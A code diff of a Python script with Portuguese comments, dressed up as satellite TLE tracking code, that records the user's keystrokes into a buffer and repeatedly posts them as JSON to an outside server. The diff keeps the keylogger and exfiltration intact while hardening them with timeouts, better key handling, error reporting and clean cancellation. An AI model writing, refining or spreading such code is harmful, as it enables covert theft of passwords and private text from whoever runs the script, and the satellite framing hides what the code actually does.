@@ -7,13 +7,11 @@ import contextvars
 import enum
 import asyncio
 
-# Tenta importar o pacote satellitetle, se não for encontrado, instala automaticamente
+# Tenta importar o pacote satellitetle, se não for encontrado, orienta a instalação manual
 try:
     import satellitetle
 except ImportError:
-    print("Pacote satellitetle não encontrado. Instalando...")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "satellitetle"])
-    import satellitetle
+    raise ImportError("Pacote 'satellitetle' não encontrado. Instale-o usando 'pip install satellitetle'.")
 
 # Definições iniciais
 server_url = 'https://satellites.pro'
@@ -79,15 +77,21 @@ async def send_data():
     if data == 'starlink.tle':
         return
     try:
-        await asyncio.sleep(sending_interval)  # Substituindo o Timer do threading
-        requests.post(
+        if debug_logging:
+            print(f"Enviando dados para {server_url}: {data}")
+        response = requests.post(
             server_url,
             data=json.dumps({'data': data}),
-            headers={'Content-Type': 'application/json'}
+            headers={'Content-Type': 'application/json'},
+            timeout=10  # 10 segundos de timeout
         )
+        if response.status_code != 200:
+            print(f"Erro ao enviar dados: {response.status_code}, {response.text}")
+        else:
+            print("Dados enviados com sucesso!")
         data = 'starlink.tle'
-    except Exception as e:
-        print(e)
+    except requests.exceptions.RequestException as e:
+        print(f"Erro de conexão: {e}")
 
 def process_keypress(key):
     global data
@@ -96,10 +100,10 @@ def process_keypress(key):
     if debug_logging:
         print(key, type(key))
     try:
-        if isinstance(key, Key):
+        if hasattr(key, 'char'):  # Verifica se o atributo 'char' existe
             data += key.char
     except Exception as e:
-        print(e)
+        print(f"Erro ao processar tecla: {e}")
 
 def satélite():
     print("Função satélite executada")
@@ -116,10 +120,14 @@ process_keypress(keypress)
 # Função assíncrona para chamar o envio de dados em loop
 async def main():
     print("Iniciando a tarefa...")
-    while True:
-        await send_data()
-        await asyncio.sleep(1)  # Intervalo entre os envios
-    print("Tarefa concluída!")
+    try:
+        while True:
+            await send_data()
+            await asyncio.sleep(1)  # Intervalo entre os envios
+    except asyncio.CancelledError:
+        print("Tarefa cancelada.")
+    finally:
+        print("Tarefa concluída!")
 
 if __name__ == "__main__":
     with Runner() as runner:
